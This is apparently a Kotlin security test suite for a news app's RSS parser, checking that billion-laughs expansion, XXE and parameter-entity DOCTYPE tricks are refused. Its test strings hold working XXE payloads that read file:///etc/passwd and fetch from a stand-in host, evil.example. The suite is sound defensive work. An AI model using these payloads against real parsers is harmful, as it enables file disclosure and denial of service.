package app.newz.security

import app.newz.feed.FeedParseException
import app.newz.feed.FeedParser
import app.newz.feed.ParsedFeed
import kotlinx.coroutines.test.runTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertTrue
import kotlin.time.Duration.Companion.seconds
import kotlin.time.TimeSource

/** Hostile XML (phase 19 security pass): XXE, billion laughs and parameter-entity tricks. */
class XmlEntityHardeningTest {
    private suspend fun parse(xml: String) = FeedParser.parse(xml.encodeToByteArray(), null)

    /** Parses [xml] within 2 s; a refusal ([FeedParseException]) is an allowed outcome, a crash is not. */
    private suspend fun parseQuickly(xml: String): ParsedFeed? {
        val mark = TimeSource.Monotonic.markNow()
        val feed =
            try {
                parse(xml)
            } catch (_: FeedParseException) {
                null
            }
        val took = mark.elapsedNow()
        assertTrue(took <= 2.seconds, "parsing took $took")
        return feed
    }

    private fun ParsedFeed.allText(): String =
        title + items.joinToString(" ") { "${it.title} ${it.summary.orEmpty()} ${it.url}" }

    @Test
    fun billionLaughsIsNotExpanded() =
        runTest {
            val entities =
                buildString {
                    append("<!ENTITY lol \"lol\">")
                    for (n in 1..9) {
                        val prev = if (n == 1) "&lol;" else "&lol${n - 1};"
                        append("<!ENTITY lol$n \"${prev.repeat(10)}\">")
                    }
                }
            val xml =
                "<?xml version=\"1.0\"?><!DOCTYPE rss [$entities]>" +
                    "<rss version=\"2.0\"><channel><title>Laughs &lol9;</title><link>https://l.example/</link>" +
                    "<item><title>Item &lol9;</title><link>https://l.example/a</link>" +
                    "<description>&lol9;</description></item></channel></rss>"
            val feed = parseQuickly(xml) ?: return@runTest
            assertFalse(feed.allText().contains("lollol"), "entities were expanded")
            assertTrue(feed.allText().length < 1_000)
        }

    @Test
    fun externalEntityIsNotResolved() =
        runTest {
            val xml =
                "<?xml version=\"1.0\"?>" +
                    "<!DOCTYPE rss [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">" +
                    "<!ENTITY web SYSTEM \"https://evil.example/x\">]>" +
                    "<rss version=\"2.0\"><channel><title>X</title><link>https://x.example/</link>" +
                    "<item><title>Leak &xxe;&web;</title><link>https://x.example/a</link>" +
                    "<description>&xxe;</description></item></channel></rss>"
            val feed = parseQuickly(xml) ?: return@runTest
            assertFalse(feed.allText().contains("root:"), "a local file was read")
        }

    @Test
    fun parameterEntityAndDoctypeTricksAreRefused() =
        runTest {
            // A quoted "]>" inside the internal subset ends the DOCTYPE pattern early; the leftover
            // declarations must make the feed fail, never reach a parser.
            val xml =
                "<!DOCTYPE rss [<!ENTITY a \"]>\"><!ENTITY % p SYSTEM \"https://evil.example/p.dtd\"> %p;]>" +
                    "<rss version=\"2.0\"><channel><title>P</title><link>https://p.example/</link>" +
                    "<item><title>T</title><link>https://p.example/a</link></item></channel></rss>"
            assertFailsWith<FeedParseException> { parse(xml) }
        }

    private fun feedWith(description: String) =
        "<rss version=\"2.0\"><channel><title>Sec</title><link>https://s.example/</link>" +
            "<item><title>On XXE</title><link>https://s.example/a</link>" +
            "<description>$description</description></item></channel></rss>"

    @Test
    fun aDeclarationQuotedInsideCdataIsJustText() =
        runTest {
            // B44: a security blog quoting an XXE payload must not make its whole feed fail.
            val payload = "<![CDATA[<p>Try <code><!ENTITY xxe SYSTEM \"file:///etc/passwd\"></code></p>]]>"
            val feed = parse(feedWith(payload))
            assertEquals(listOf("On XXE"), feed.items.map { it.title })
            assertFalse(feed.allText().contains("root:"))
        }

    @Test
    fun aDeclarationOutsideCdataOrCommentsIsStillRefused() =
        runTest {
            // A comment that only looks like it opens a CDATA section hides nothing: the quoted
            // "]>" leaves a declaration behind once the DOCTYPE pattern has run, as above.
            val afterComment =
                "<!-- <![CDATA[ --><!DOCTYPE rss [<!ENTITY a \"]>\"><!ENTITY x SYSTEM \"file:///etc/passwd\">]>"
            assertFailsWith<FeedParseException> { parse(afterComment + feedWith("x")) }
            // An unterminated CDATA section is refused rather than trusted.
            assertFailsWith<FeedParseException> { parse(feedWith("<![CDATA[ <!ENTITY x \"y\">")) }
            // A declaration in plain element text is refused, as before.
            assertFailsWith<FeedParseException> { parse(feedWith("<!ENTITY x \"y\">")) }
        }
}
